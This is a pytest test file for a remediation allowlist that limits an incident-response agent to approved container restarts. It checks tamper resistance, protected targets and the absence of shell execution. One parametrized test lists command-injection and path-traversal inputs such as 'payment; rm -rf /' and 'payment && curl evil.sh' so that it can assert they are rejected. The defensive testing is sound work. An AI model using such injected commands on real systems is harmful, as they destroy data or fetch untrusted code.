"""The remediation allowlist — the security boundary for human-in-the-loop.

These tests exist because this is the one place in the system where the agent can
change production. The properties worth pinning are not "does restart work" but
"can anything other than an allowlisted restart ever run".
"""
from __future__ import annotations

import pytest

from src.agent import remediation


@pytest.fixture
def running(monkeypatch):
    """Pretend a fixed set of containers is running."""
    names = {"payment", "cart", "checkout", "signoz-signoz-0", "incimin-postgres-1"}
    monkeypatch.setattr(remediation, "running_containers", lambda: names)
    return names


# -- target resolution -----------------------------------------------------


def test_resolves_exact_container_name(running):
    container, _ = remediation.resolve_target("payment")
    assert container == "payment"


def test_strips_service_suffix_when_the_bare_name_is_running(running):
    """Topology and containers mostly agree, but an alert's service.name label may
    carry the suffix convention (`paymentservice` vs the `payment` container)."""
    container, reason = remediation.resolve_target("paymentservice")
    assert container == "payment"
    assert "paymentservice -> payment" in reason


def test_refuses_a_service_with_no_running_container(running):
    """Resolution never invents a target — an unmatched name is a refusal, not a guess."""
    container, reason = remediation.resolve_target("ghost")
    assert container is None
    assert "no running container" in reason


@pytest.mark.parametrize(
    "name",
    [
        "payment; rm -rf /",
        "payment && curl evil.sh",
        "$(whoami)",
        "../../etc/passwd",
        "-v/:/host",  # would be read as a docker flag, not a container
        "",
        "PAYMENT",  # uppercase is not a valid container name here
    ],
)
def test_rejects_names_that_are_not_plain_container_names(running, name):
    container, _ = remediation.resolve_target(name)
    assert container is None, f"{name!r} must not resolve"


@pytest.mark.parametrize("name", ["signoz-signoz-0", "incimin-postgres-1"])
def test_refuses_to_touch_protected_infrastructure(running, name):
    """Restarting ClickHouse mid-incident would blind the agent; restarting Postgres
    would drop the checkpoint a paused run resumes from."""
    container, reason = remediation.resolve_target(name)
    assert container is None
    assert "protected" in reason


# -- proposals -------------------------------------------------------------


def test_proposal_binds_the_exact_argv_a_human_approves(running):
    p = remediation.propose("restart_service", "payment")

    assert p["executable"] is True
    assert p["container"] == "payment"
    assert p["argv"] == ["docker", "restart", "payment"]
    assert "payment" in p["statement"]


def test_unknown_action_is_not_executable(running):
    p = remediation.propose("rm_minus_rf", "payment")

    assert p["executable"] is False
    assert "not an allowlisted action" in p["reason"]


def test_unresolvable_service_yields_a_non_executable_proposal(running):
    p = remediation.propose("restart_service", "ghost")

    assert p["executable"] is False


# -- execution -------------------------------------------------------------


def test_execute_rebuilds_argv_from_the_allowlist(running, monkeypatch):
    """A stored proposal is data. If execution trusted its `argv` field, anything
    that could write an approval row could write a command line."""
    seen = {}

    class _Proc:
        returncode = 0
        stdout = "payment"
        stderr = ""

    def fake_run(argv, **kw):
        seen["argv"] = argv
        seen["shell"] = kw.get("shell", False)
        return _Proc()

    monkeypatch.setattr(remediation.subprocess, "run", fake_run)

    tampered = {
        "action_id": "restart_service",
        "container": "payment",
        "argv": ["docker", "rm", "-f", "everything"],  # ignored
    }
    result = remediation.execute(tampered)

    assert result.ok
    assert seen["argv"] == ["docker", "restart", "payment"]
    assert seen["shell"] is False, "shell=True would make quoting a security question"


def test_execute_refuses_a_protected_container(monkeypatch):
    called = []
    monkeypatch.setattr(remediation.subprocess, "run", lambda *a, **k: called.append(a))

    result = remediation.execute({"action_id": "restart_service", "container": "signoz-signoz-0"})

    assert result.ok is False
    assert "protected" in result.detail
    assert called == [], "nothing may be spawned for a protected target"


def test_execute_refuses_an_unknown_action(monkeypatch):
    called = []
    monkeypatch.setattr(remediation.subprocess, "run", lambda *a, **k: called.append(a))

    result = remediation.execute({"action_id": "nope", "container": "payment"})

    assert result.ok is False
    assert called == []


def test_nonzero_exit_is_reported_as_failure(monkeypatch):
    class _Proc:
        returncode = 1
        stdout = ""
        stderr = "No such container: payment"

    monkeypatch.setattr(remediation.subprocess, "run", lambda *a, **k: _Proc())

    result = remediation.execute({"action_id": "restart_service", "container": "payment"})

    assert result.ok is False
    assert result.returncode == 1
    assert "No such container" in result.stderr


def test_timeout_is_reported_rather_than_raised(monkeypatch):
    import subprocess as sp

    def boom(*_a, **_k):
        raise sp.TimeoutExpired(cmd="docker", timeout=remediation.EXEC_TIMEOUT_SECONDS)

    monkeypatch.setattr(remediation.subprocess, "run", boom)

    result = remediation.execute({"action_id": "restart_service", "container": "payment"})

    assert result.ok is False
    assert "timed out" in result.detail
